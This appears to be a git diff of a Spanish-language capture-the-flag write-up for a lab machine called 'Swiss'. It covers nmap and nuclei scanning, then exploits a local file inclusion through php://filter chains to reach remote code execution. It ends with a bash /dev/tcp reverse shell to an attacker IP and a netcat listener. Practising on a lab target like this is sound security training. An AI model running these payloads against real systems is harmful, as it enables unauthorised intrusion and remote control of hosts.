@@ -1,12 +1,16 @@
+# Swiss (hold)
+
 tags:
-____
-## Reconocimiento
+
+***
+
+### Reconocimiento
 
 ```bash
 ping -c 1 172.17.0.2
 ```
 
-![Pasted image 20251108161644](../../../Anexos/Pasted%20image%2020251108161644.png)
+![Pasted image 20251108161644](<../../../.gitbook/assets/Pasted image 20251108161644.png>)
 
 Estamos ante un sistema linux, así que seguimos haciendo un escaneo básico de puertos, para conocer cuales están abiertos y buscar un vector de ataque. Para ello usamos el siguiente comando:
 
@@ -16,7 +20,7 @@ nmap -sS -p- --min-rate 5000 -n -Pn -vvv -oN ports 172.17.0.2
 
 Esto nos permite exportar al fichero **ports** todos los puertos en formato nmap. Obtenemos lo siguiente:
 
-![Pasted image 20251108161818](../../../Anexos/Pasted%20image%2020251108161818.png)
+![Pasted image 20251108161818](<../../../.gitbook/assets/Pasted image 20251108161818.png>)
 
 Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión del servicio que corre por el puerto 80 y también lanzar unos scripts de nmap parra aplicar un reconocimiento:
 
@@ -24,13 +28,13 @@ Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión d
 nmap -sCV --min-rate 5000 -vvv -n -Pn -p22,80 -vvv -oN version 172.17.0.2
 ```
 
-![Pasted image 20251108161837](../../../Anexos/Pasted%20image%2020251108161837.png)
+![Pasted image 20251108161837](<../../../.gitbook/assets/Pasted image 20251108161837.png>)
 
 Solamente encontramos el puerto ssh abierto y un servicio web corriendo por el puerto 80, así que vamos a ver de qué se trata:
 
-![Pasted image 20251108202452](../../../Anexos/Pasted%20image%2020251108202452.png)
+![Pasted image 20251108202452](<../../../.gitbook/assets/Pasted image 20251108202452.png>)
 
-![Pasted image 20251108202512](../../../Anexos/Pasted%20image%2020251108202512.png)
+![Pasted image 20251108202512](<../../../.gitbook/assets/Pasted image 20251108202512.png>)
 
 Vamos a ejecutar la herramienta nuclei para hacer un escaneo de posibles vulnerabilidades a la página:
 
@@ -38,11 +42,11 @@ Vamos a ejecutar la herramienta nuclei para hacer un escaneo de posibles vulnera
 nuclei -u http://172.17.0.2
 ```
 
-![Pasted image 20251108202738](../../../Anexos/Pasted%20image%2020251108202738.png)
+![Pasted image 20251108202738](<../../../.gitbook/assets/Pasted image 20251108202738.png>)
 
 Tenemos un parámetro file que nos permite realizar un Local File Inclusion, así que vamos a usar este vector para entrar en la máquina. Primero vamos a ver el archivo passwd:
 
-![Pasted image 20251108203002](../../../Anexos/Pasted%20image%2020251108203002.png)
+![Pasted image 20251108203002](<../../../.gitbook/assets/Pasted image 20251108203002.png>)
 
 Al ver que podemos ejecutar un local file inclusion a través de un parámetro en la url, voy a probar utilizar php wrappers para comprobar si podemos interpretar comandos antes de que se ejecute el código. Para esto primero pruebo con un php wrapper sencillo:
 
@@ -50,9 +54,9 @@ Al ver que podemos ejecutar un local file inclusion a través de un parámetro e
 http://172.17.0.2/index.php?file=php://filter/convert.base64-encode/resource=index.php
 ```
 
-![Pasted image 20251108212059](../../../Anexos/Pasted%20image%2020251108212059.png)
+![Pasted image 20251108212059](<../../../.gitbook/assets/Pasted image 20251108212059.png>)
 
-El código se ejecuta, así que ahora vamos a probar hacer una ejecución remota de comandos utilizando la herramienta **php_filter_chain_generator** para enviar un comando, en este caso whoami. Para ello utilizo el siguiente comando:
+El código se ejecuta, así que ahora vamos a probar hacer una ejecución remota de comandos utilizando la herramienta **php\_filter\_chain\_generator** para enviar un comando, en este caso whoami. Para ello utilizo el siguiente comando:
 
 ```python
 python3 php_filter_chain_generator.py --chain "<?php system('whoami'); ?>"
@@ -66,9 +70,9 @@ php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.
 
 Si ahora añadimos esa cadena a la URL, obtenemos la RCE:
 
-![Pasted image 20251108213128](../../../Anexos/Pasted%20image%2020251108213128.png)
+![Pasted image 20251108213128](<../../../.gitbook/assets/Pasted image 20251108213128.png>)
 
-Ahora vamos a ejecutar una reverse shell en lugar de un whoami, así que generamos la cadena con el php_filter_chain_generator y nos ponemos en escucha por el puerto 443 con netcat:
+Ahora vamos a ejecutar una reverse shell en lugar de un whoami, así que generamos la cadena con el php\_filter\_chain\_generator y nos ponemos en escucha por el puerto 443 con netcat:
 
 ```bash
 python3 php_filter_chain_generator.py --chain '<?php echo shell_exec($_GET["cmd"]);?>'
@@ -77,4 +81,3 @@ nc -lvnp 443
 
 &cmd=bash -c "bash -i >%26 /dev/tcp/192.168.0.28/443 0>%261"
 ```
-
